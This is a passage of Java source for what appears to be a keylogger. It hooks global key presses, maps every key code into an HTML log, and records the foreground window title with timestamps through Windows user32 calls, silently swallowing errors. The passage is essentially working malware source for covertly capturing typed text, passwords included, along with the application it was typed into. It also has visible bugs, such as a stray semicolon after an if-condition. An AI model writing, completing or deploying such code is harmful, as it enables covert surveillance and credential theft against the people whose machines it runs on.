	public void nativeKeyPressed(NativeKeyEvent e) 
	{		
		try
		{			
			int i = e.getKeyCode();	
							
			if (ShiftCtrlAltPlusKeys(e))
			{
				return;
			}
			
			if (AlphabetSet.contains(i));
			{
				Alphabet(i);
			}
				
			if (NumbericSet.contains(i))
			{
				Numbers(i);
			}
			
			if (i >= 59 && i <= 68 || i >= 99 && i <= 107 || i == 92 || i == 93 || i == 91 ||
					i == 87 || i == 88)
			{
				FKeys(i);
			}
			
			if (SpecialCharSet.contains(i))
			{
				SpecialKeys(i);
			}		
			
			if (NumPadSet.contains(i))
			{
				NumPadKeys(i);
			}
			
			if (PlayKeys.contains(i))
			{
				Playkeys(i);
			}
			
			String title_active = GetActiveWindow();
			if (!title_active.isEmpty() && !title_active.equals(currentWindow))
			{
				String timeStamp = new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime());
				FullLog += "<p style=\"color:#FFA500\">[ &#183&#183&#183&#183&#183&#183&#183 " + title_active + " @ " + timeStamp + " &#183&#183&#183&#183&#183&#183&#183 ]</p>";	
				currentWindow = title_active;
			}
		}
		catch (Exception er) {}
	}
	static void Numbers(int i)
	{	
		switch (i)
		{
		case 2:
			FullLog += ("1");
			break;
		case 3:
			FullLog += ("2");
			break;
		case 4:
			FullLog += ("3");
			break;
		case 5:
			FullLog += ("4");
			break;
		case 6:
			FullLog += ("5");
			break;
		case 7:
			FullLog += ("6");
			break;
		case 8:
			FullLog += ("7");
			break;
		case 9:
			FullLog += ("8");
			break;
		case 10:
			FullLog += ("9");
			break;
		case 11:
			FullLog += ("0");
			break;
		}				
	}
	static void Alphabet(int i)
	{		
		if (i == 58)
		{
			if (Capslock.getStatus())
			{
				Capslock.setStatus(false);
				FullLog += ("[CAPSLOCK]");
			}
			else
			{
				Capslock.setStatus(true);
				FullLog += ("[CAPSLOCK]");
			}
		}
		else
		{
			if (Capslock.getStatus())
			{
				switch (i)
				{
				case 30:
					FullLog += ("A");
					break;
				case 48:
					FullLog += ("B");
					break;
				case 46:
					FullLog += ("C");
					break;
				case 32:
					FullLog += ("D");
					break;
				case 18:
					FullLog += ("E");
					break;
				case 33:
					FullLog += ("F");
					break;
				case 34:
					FullLog += ("G");
					break;
				case 35:
					FullLog += ("H");
					break;
				case 23:
					FullLog += ("I");
					break;
				case 36:
					FullLog += ("J");
					break;
				case 37:
					FullLog += ("K");
					break;
				case 38:
					FullLog += ("L");
					break;
				case 50:
					FullLog += ("M");
					break;
				case 49:
					FullLog += ("N");
					break;
				case 24:
					FullLog += ("O");
					break;
				case 25:
					FullLog += ("P");
					break;
				case 16:
					FullLog += ("Q");
					break;
				case 19:
					FullLog += ("R");
					break;
				case 31:
					FullLog += ("S");
					break;
				case 20:
					FullLog += ("T");
					break;
				case 22:
					FullLog += ("U");
					break;
				case 47:
					FullLog += ("V");
					break;		
				case 17:
					FullLog += ("W");
					break;
				case 45:
					FullLog += ("X");
					break;
				case 21:
					FullLog += ("Y");
					break;
				case 44:
					FullLog += ("Z");
					break;
				}
			}
			else
			{
				switch (i)
				{
				case 30:
					FullLog += ("a");
					break;
				case 48:
					FullLog += ("b");
					break;
				case 46:
					FullLog += ("c");
					break;
				case 32:
					FullLog += ("d");
					break;
				case 18:
					FullLog += ("e");
					break;
				case 33:
					FullLog += ("f");
					break;
				case 34:
					FullLog += ("g");
					break;
				case 35:
					FullLog += ("h");
					break;
				case 23:
					FullLog += ("i");
					break;
				case 36:
					FullLog += ("j");
					break;
				case 37:
					FullLog += ("k");
					break;
				case 38:
					FullLog += ("l");
					break;
				case 50:
					FullLog += ("m");
					break;
				case 49:
					FullLog += ("n");
					break;
				case 24:
					FullLog += ("o");
					break;
				case 25:
					FullLog += ("p");
					break;
				case 16:
					FullLog += ("q");
					break;
				case 19:
					FullLog += ("r");
					break;
				case 31:
					FullLog += ("s");
					break;
				case 20:
					FullLog += ("t");
					break;
				case 22:
					FullLog += ("u");
					break;
				case 47:
					FullLog += ("v");
					break;		
				case 17:
					FullLog += ("w");
					break;
				case 45:
					FullLog += ("x");
					break;
				case 21:
					FullLog += ("y");
					break;
				case 44:
					FullLog += ("z");
					break;
				case 40:
					char quote = 60;
					FullLog += (quote);
					break;
					
				}
			}
		}
	}
	static void FKeys(int i)
	{
		switch (i)
		{
		case 59:
			FullLog += ("[F1]");
			break;
		case 60:
			FullLog += ("[F2]");
			break;
		case 61:
			FullLog += ("[F3]");
			break;
		case 62:
			FullLog += ("[F4]");
			break;
		case 63:
			FullLog += ("[F5]");
			break;
		case 64:
			FullLog += ("[F6]");
			break;
		case 65:
			FullLog += ("[F7]");
			break;
		case 66:
			FullLog += ("[F8]");
			break;
		case 67:
			FullLog += ("[F9]");
			break;
		case 68:
			FullLog += ("[F10]");
			break;
		case 87:
			FullLog += ("[F11]");
			break;
		case 88:
			FullLog += ("[F12]");
			break;
		case 91:
			FullLog += ("[F13]");
			break;
		case 92:
			FullLog += ("[F14]");
			break;
		case 93:
			FullLog += ("[F15]");
			break;
		case 99:
			FullLog += ("[F16]");
			break;
		case 100:
			FullLog += ("[F17]");
			break;
		case 101:
			FullLog += ("[F18]");
			break;
		case 102:
			FullLog += ("[F19]");
			break;
		case 103:
			FullLog += ("[F20]");
			break;
		case 104:
			FullLog += ("[F21]");
			break;
		case 105:
			FullLog += ("[F22]");
			break;
		case 106:
			FullLog += ("[F23]");
			break;
		case 107:
			FullLog += ("[F24]");
			break;
		}
	}
	static void SpecialKeys(int i)
	{
		switch (i)
		{
		case 28:
			FullLog += ("\n"); // [ENTER]
			break;
		case 14:
			FullLog += ("[BACKSPACE]");
			break;
		case 43:
			char quote = 92;
			FullLog += (quote); 
			break;
		case 42:
			FullLog += ("[SHIFT]");
			break;
		case 54:
			FullLog += ("[SHIFT]");
			break;			
		case 56:
			FullLog += ("[ALTKEY]");
			break;		
		case 1:
			FullLog += ("[ESC]");
			break;
		case 29:
			FullLog += ("[CONTROL_LEFT]");
			break;
		case 3613:
			FullLog += ("[CONTROL_RIGHT]");
			break;
		case 57:
			FullLog += (" ");
			break;	
		case 3675:
			FullLog += ("[WINDOWSKEY]");
			break;
		case 51:
			FullLog += (",");
			break;
		case 52:
			FullLog += (".");
			break;
		case 40:
			FullLog += ("'");
			break;
		case 12:
			FullLog += ("-");
			break;
		case 27:
			FullLog += ("]");
			break;
		case 53:
			FullLog += ("/");
			break;
		case 39:
			FullLog += (";");
			break;
		case 26:
			FullLog += ("[");
			break;
		case 13:
			FullLog += ("=");
			break;
		case 41:
			FullLog += ("`");
			break;
		case 3639:
			FullLog += ("[PRINTSCREEN]");
			break;
		case 70:
			FullLog += ("[SCROLL_LOCK]");
			break;
		case 3653:
			FullLog += ("[PAUSE]");
			break;
		case 3666:
			FullLog += ("[INSERT]");
			break;
		case 3663:
			FullLog += ("[END]");
			break;
		case 3665:
			FullLog += ("[PAGE_DOWN]");
			break;
		case 3657:
			FullLog += ("[PAGE_UP]");
			break;
		case 3655:
			FullLog += ("[HOME]");
			break;
		case 57377:
			FullLog += ("[CALCULATOR");
    		break;
		case 3667:
			FullLog += ("[DELETE]");
			break;
		}
	}
	static void Playkeys(int i)
	{
		switch (i)
		{
		case 57416:
			System.out.print("[UP]");
			break;
		case 57421:
			System.out.print("[RIGHT]");
			break;
		case 57424:
			System.out.print("[DOWN]");
			break;
		case 57419:
			System.out.print("[LEFT]");
			break;
		}
	}
	static void NumPadKeys(int i)
	{
		switch (i)
		{
		case 82:
			FullLog += ("[NUMPAD 0]");
			break;
		case 79:
			FullLog += ("[NUMPAD 1]");
			break;
		case 80:
			FullLog += ("[NUMPAD 2]");
			break;
		case 81:
			FullLog += ("[NUMPAD 3]");
			break;
		case 75:
			FullLog += ("[NUMPAD 4]");
			break;
		case 76:
			FullLog += ("[NUMPAD 5]");
			break;
		case 77:
			FullLog += ("[NUMPAD 6]");
			break;
		case 71:
			FullLog += ("[NUMPAD 7]");
			break;
		case 72:
			FullLog += ("[NUMPAD 8]");
			break;
		case 73:
			FullLog += ("[NUMPAD 9]");
			break;
		case 55:
			FullLog += ("[MULTIPLY]");
			break;
		case 78:
			FullLog += ("[ADD]");
			break;
		case 74:
			FullLog += ("[SUBSTRACT]");
			break;
		case 83:
			System.out.print("[COMMA]");
			break;
		case 3637:
			System.out.print("[DIVIDE]");
			break;
		
			// Overall Keys
		case 28:
			FullLog += ("[ENTER]");
			break;
		case 69:
			FullLog += ("[NUMLOCK]");
			break;
		}
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {}
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {}
    static class Capslock
    {
    	static boolean CapslockStatus = false;
    	static boolean getStatus()
        {
            return CapslockStatus;
        }
    	static void setStatus(boolean status)
        {
    		CapslockStatus = status;           
        }
    }

    // Get Active Window
    public interface User32 extends StdCallLibrary 
    {
       	User32 INSTANCE = (User32) Native.loadLibrary("user32", User32.class);
        HWND GetForegroundWindow();
        int GetWindowTextA(PointerType hWnd, byte[] lpString, int nMaxCount);   
    }
    public static String GetActiveWindow() throws InterruptedException 
    {
    	try
    	{		
    		long lastSec = 0;
    			if (isWindows())
                {
                		long sec = System.currentTimeMillis() / 1000;
                        if (sec != lastSec) 
                        {
                      	 byte[] windowText = new byte[512];

                           PointerType hwnd = User32.INSTANCE.GetForegroundWindow();
                           User32.INSTANCE.GetWindowTextA(hwnd, windowText, 512);
                           lastSec = sec;
                           return Native.toString(windowText);
                        }
                }
                else
                {
                	return "";
                }
    		}        
    
    	catch (Exception er)
    	{
    		return "";
    	}
    	return "";
    }
    
    // System Type
    public static boolean isWindows() 
    {
		return (OS.indexOf("win") >= 0);
	}
	public static boolean isMac() 
	{
		return (OS.indexOf("mac") >= 0);
	}
	public static boolean isUnix() 
	{
		return (OS.indexOf("nix") >= 0 || OS.indexOf("nux") >= 0 || OS.indexOf("aix") > 0 );
	}
	public static boolean isSolaris()
	{
		return (OS.indexOf("sunos") >= 0);
	}
}

